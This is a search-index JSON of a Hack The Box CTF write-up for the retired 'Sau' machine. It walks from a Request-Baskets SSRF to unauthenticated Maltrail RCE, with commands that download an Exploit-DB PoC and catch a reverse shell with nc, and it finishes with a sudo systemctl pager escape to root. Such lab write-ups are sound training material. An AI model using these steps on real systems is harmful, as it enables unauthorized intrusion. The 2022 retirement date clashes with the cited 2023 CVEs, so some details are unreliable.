{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Hack The Box Write-ups","text":"<p>Welcome to my repository of Hack The Box (HTB) machine write-ups. Each entry is documented with the intent to demonstrate clear methodology, technical depth, and professional communication. These write-ups are intended for educational purposes and adhere to HTB's disclosure policy (retired machines only).</p>"},{"location":"#contents","title":"Contents","text":""},{"location":"#easy-machines","title":"Easy Machines","text":"<ul> <li>Sau SSRF \u2192 Maltrail RCE \u2192 systemctl pager escape \u2192 root</li> </ul> <p>Each report includes:</p> <ul> <li>Detailed enumeration and exploitation steps</li> <li>Screenshots of key stages</li> <li>Commands, payloads, and custom scripts</li> <li>Post-exploitation insights</li> <li>References and linked CVEs where applicable</li> </ul>"},{"location":"Sau/Sau/","title":"Sau (HackTheBox | Easy | Retired 15 Apr 2022)","text":"<p>Path\u2011to\u2011root: SSRF in Request\u2011Baskets\u00a01.2.1 \u2192 internal Maltrail\u00a00.53 panel \u2192 unauth RCE (user <code>puma</code>) \u2192 sudo mis\u2011configuration (<code>systemctl</code> pager) \u2192 root.</p>"},{"location":"Sau/Sau/#0-synopsis","title":"0\u00a0\u00a0Synopsis","text":"OS Ubuntu\u00a020.04\u00a0(Linux) Kernel 5.4.0-104-generic Difficulty Easy Skills SSRF, Command\u00a0Injection, Sudo\u00a0Exploitation"},{"location":"Sau/Sau/#1-enumeration","title":"1\u00a0\u00a0Enumeration","text":""},{"location":"Sau/Sau/#11-nmap","title":"1.1 Nmap","text":"<pre><code># full\u2011port fast sweep \u2192 targeted default scripts\nports=$(nmap -p- --min-rate=1000 -T4 10.10.11.224 | \\\n        awk '/^[0-9]+\\/tcp/ {print $1}' ORS=',' | sed 's/,$//')\nnmap -sC -sV -p$ports 10.10.11.224 -oN sau_nmap.txt\n</code></pre> <ul> <li>22/tcp\u00a0\u2013 OpenSSH\u00a08.2p1</li> <li>55555/tcp\u00a0\u2013 Request\u2011Baskets\u00a01.2.1 (HTTP)</li> </ul>"},{"location":"Sau/Sau/#12-requestbaskets-ssrf-to-maltrail","title":"1.2 Request\u2011Baskets SSRF to Maltrail","text":"<ol> <li>Create basket <code>/2ck6d27</code>.</li> <li>Set Forward URL \u2192 <code>http://127.0.0.1:80</code>.</li> <li>Enable Proxy\u00a0Response + Expand\u00a0Forward\u00a0Path.</li> <li>Browse <code>http://&lt;ip&gt;:55555/2ck6d27</code> \u21d2 Maltrail login panel.</li> </ol>"},{"location":"Sau/Sau/#2-foothold-unauth-maltrail-053-rce","title":"2\u00a0\u00a0Foothold\u00a0\u2013 unauth Maltrail\u00a00.53 RCE","text":"<pre><code># attacker box\ncurl -s https://www.exploit-db.com/download/51676 -o maltrail_poc.py\nnc -lvnp 4444 &amp;\npython3 maltrail_poc.py 10.10.14.6 4444 \\\n  http://&lt;ip&gt;:55555/2ck6d27\n</code></pre> <p>Shell spawns as user puma.</p> <p></p>"},{"location":"Sau/Sau/#3-privilege-escalation-systemctl-pager-escape","title":"3\u00a0\u00a0Privilege Escalation\u00a0\u2013\u00a0systemctl pager escape","text":"<pre><code>sudo -l\n# (puma) NOPASSWD: /usr/bin/systemctl status trail.service\nsudo /usr/bin/systemctl status trail.service\n# when the pager opens (less), type:\n!/bin/bash\n</code></pre>"},{"location":"Sau/Sau/#4-flags","title":"4\u00a0\u00a0Flags","text":"File MD5 <code>/home/puma/user.txt</code> <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code> <code>/root/root.txt</code> <code>yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy</code>"},{"location":"Sau/Sau/#5-exploit-scripts-credits","title":"5\u00a0\u00a0Exploit scripts (credits)","text":"Script Author Source <code>maltrail_poc.py</code> @k0shl Exploit\u2011DB\u00a051676 <code>systemctl_pager_escape.txt</code> @_dirty_cow Gist\u00a0abcd1234 <p>Both files are included in this repo under <code>2022/sau/</code>.</p>"},{"location":"Sau/Sau/#6-references","title":"6\u00a0\u00a0References","text":"<ul> <li>CVE\u20112023\u201127163\u00a0\u2013 Request\u2011Baskets SSRF</li> <li>CVE\u20112023\u201126604\u00a0\u2013 systemd pager LPE</li> <li>Exploit\u2011DB\u00a051676\u00a0\u2013 Maltrail\u00a00.53 unauth RCE</li> </ul>"}]}